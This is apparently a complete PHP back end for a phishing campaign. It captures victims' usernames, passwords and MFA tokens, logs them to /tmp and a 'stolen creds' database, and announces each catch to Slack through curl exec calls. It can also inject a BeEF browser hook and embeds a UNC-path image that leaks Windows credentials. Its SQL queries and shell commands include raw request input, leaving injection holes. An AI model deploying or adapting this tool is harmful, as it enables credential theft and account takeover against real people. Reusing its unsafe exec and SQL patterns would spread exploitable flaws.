<?php

// Set Slack Webhook URL
$slackurl = "https://hooks.slack.com/services/YOUR_SLACK_INCOMING_WEBHOOK_URL_HERE";
$slackchannel = "#YOUR_SLACK_CHANNEL_HERE";
$slackemoji = ":fishing_pole_and_fish:";
$slackbotname = "PhishBot";
// OR BOT TOKEN
$SlackLegacyToken = "YOUR_SLACK_LEGACY_TOKEN_OR_SLACKBOT_TOKEN_HERE";

// Set Optional BEEF Hook URL
//$BEEFUrl = "https://YOUR_DOMAIN_HERE.com:3000/hook.js";
$BEEFUrl = "";

// Receives Required Parameters and Sets Variables
$ip = $_SERVER['REMOTE_ADDR'];
$user = $_REQUEST['username'];
$pass = $_REQUEST['password'];
$portal = $_REQUEST['project'];
$redirect = $_REQUEST['redirect'];

// Receives Optional Parameters and Overrides Variables
if(isset($_REQUEST['token'])){$MFAToken = $_REQUEST['token'];}else{$MFAToken = "";}
if(isset($_REQUEST['slackemoji'])){$slackemoji = $_REQUEST['slackemoji'];}
if(isset($_REQUEST['slackbotname'])){$slackbotname = $_REQUEST['slackbotname'];}

// Makes Password Safe for DB
$user = stripslashes($user);

// Pulls in Required Connection Variables for DB
require_once 'dbconfig.php';

// Create connection
$conn = mysqli_connect($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Don't Do Anything if the User is Blank (Helps Avoid False Submissions)
if($user != ""){

// Writes User and Password to a Local Log (In Case DB Insert Fails)
$myfile = fopen("/tmp/APIPhishingLogs.txt", "a") or die("Unable to open file!");
$txt = $user." ".$pass."\n\r\n\r";
fwrite($myfile, "\n". $txt);
fclose($myfile);

// Checks Trophy Awards
$sqltrophy = "CALL GetAwards('$portal','$user');";
$resulttrophy = $conn->query($sqltrophy);

while($row = $resulttrophy->fetch_assoc()) {

if($row["Title"] == "MostDedicated"){
$cmdtrophy = "curl -F file=@awardgifs/TrophyMostDedicated.gif -F 'initial_comment=Third Times a Charm! - ".$user." @ ".$portal."' -F channels=".$slackchannel." -H 'Authorization: Bearer ".$SlackLegacyToken."' https://slack.com/api/files.upload";
exec($cmdtrophy);
}


if($row["Title"] == "MostDelayed"){
$cmdtrophy2 = "curl -F file=@awardgifs/TrophyMostDelayed.gif -F 'initial_comment=Partys over! - ".$user." @ ".$portal."' -F channels=".$slackchannel." -H 'Authorization: Bearer ".$SlackLegacyToken."' https://slack.com/api/files.upload";
exec($cmdtrophy2);
}

if($row["Title"] == "MostDisclosedPWs"){
$cmdtrophy3 = "curl -F file=@awardgifs/TrophyMostDisclosed.gif -F 'initial_comment=Here Try This One.. - ".$user." @ ".$portal."' -F channels=".$slackchannel." -H 'Authorization: Bearer ".$SlackLegacyToken."' https://slack.com/api/files.upload";
exec($cmdtrophy3);
}


if($row["Title"] == "MostPhish"){
$cmdtrophy4 = "curl -F file=@awardgifs/TrophyMostPhish.gif -F 'initial_comment=Gonna need a bigger boat.. ".$row["username"]." phish! - ".$portal."' -F channels=".$slackchannel." -H 'Authorization: Bearer ".$SlackLegacyToken."' https://slack.com/api/files.upload";
exec($cmdtrophy4);
}

}

printf($conn->error);
$conn->close();

$conn2 = mysqli_connect($servername, $username, $password, $dbname);

// Inserts Captured Information Into MySQL DB
$sql = "CALL InsertStolenCreds('$user','$pass','$ip','$portal','$MFAToken');";
$result = $conn2->query($sql);

printf($conn2->error);
$conn2->close();

}

?>

<HTML>
<HEAD>
<style>
body {
    margin: 0;
}
</style>

<?php
if($redirect != "" && $BEEFUrl == ""){
?>

<meta http-equiv="refresh" content="0;URL='<?php echo $redirect; ?>'" />

<?php } ?>
</HEAD>
<BODY>
    
<image height="1" width="1" xlink:href="\\<?php echo $_SERVER['SERVER_NAME'];?>/resource.svg" />

<iframe src="unc.php" width="1" height="1" frameborder="0">

<?php if($redirect == ""){?>

<h1>It Works!</h1>

<?php } ?>

<?php
if($redirect != "" && $BEEFUrl != ""){
?>

<iframe src="<?php echo $redirect; ?>" style="border: 0; width: 100%; height: 100%"></iframe>

<?php
}
// Performs BEEF Hook if Set
if($BEEFUrl != "" && $redirect != ""){?>
<script src= "<?php echo $BEEFUrl; ?>" type="text/javascript"></script>
<?php } ?>
</BODY>
</HTML>


<?php

$slacklink = "https://YOUR_DOMAIN_HERE/results/index.php?project=".$portal;

// Don't Do Anything if the User is Blank (Helps Avoid False Submissions)
if($user != ""){

// Only Proceed if There is a Password
if($pass != ""){

// Judge Password Complexity
if (preg_match("#.*^(?=.{8,20})(?=.*[a-z])(?=.*[A-Z])(?=.*[0-9]).*$#", $pass)){
    $passstrength = ":thumbsup:";
} else {
    $passstrength = ":poop:";
}

//Checks HaveIBeenPwned DB
$sha1pass = strtoupper(sha1($pass));

//echo $sha1pass."\r\n";

$cmd2 = 'curl -s -X GET "https://api.pwnedpasswords.com/range/'.substr($sha1pass, 0, 5).'"';

//echo $cmd2;

exec($cmd2);

// Executes the curl command
exec($cmd2,$pwned);

$pwnedarray = array();
$arraywithcount = array();

foreach($pwned as $pwned2){
//array_push($pwnedarray, array(substr($pwned2, 0, strrpos($pwned2, ':')), substr($pwned2, 1, strrpos($pwned2, ':'))));
$pos = strpos($pwned2, ":");
$shahash = substr($pwned2, 0, strrpos($pwned2, ':'));
$hashcount = substr($pwned2, $pos + 1);
$arraywithcount[$shahash] = $hashcount;
$pwnedarray[] = substr($pwned2, 0, strrpos($pwned2, ':'));
}

if (in_array(substr($sha1pass, 5), $pwnedarray)) {
    $TroyHunt = "yes";

$haveibeenpwnedhits = $arraywithcount[substr($sha1pass, 5)];

// If the Password is so non-unique, give a Trophy
if ($haveibeenpwnedhits >= "500"){
$cmdtrophy5 = "curl -F file=@awardgifs/TrophyLeastUniquePassword.gif -F 'initial_comment=That PW Gets Around.. (".$haveibeenpwnedhits." times!) - ".$user." @ ".$portal."' -F channels=".$slackchannel." -H 'Authorization: Bearer ".$SlackLegacyToken."' https://slack.com/api/files.upload";
exec($cmdtrophy5);
}

} else $TroyHunt = "no";

// If the Password is Set, Change Slack Message
$message = "> Caught Another Phish at ".$portal."! (<".$slacklink."|".$user.">)\r\n> Password Strength is ".$passstrength;

} else {

// If the Password is Not Set, Do Not Include Password Strength in Slack Message
$message = "> Caught Another Phish at ".$portal."! (<".$slacklink."|".$user.">)";

}

if($TroyHunt == "yes"){$message = $message."\r\n> *_HaveIBeenPwned Hit_*";}

// Execute Slack Incoming Webhook
$cmd = 'curl -s -X POST --data-urlencode \'payload={"channel": "'.$slackchannel.'", "username": "'.$slackbotname.'", "text": "'.$message.'", "icon_emoji": "'.$slackemoji.'"}\' '.$slackurl.'';

exec($cmd);

}

?>
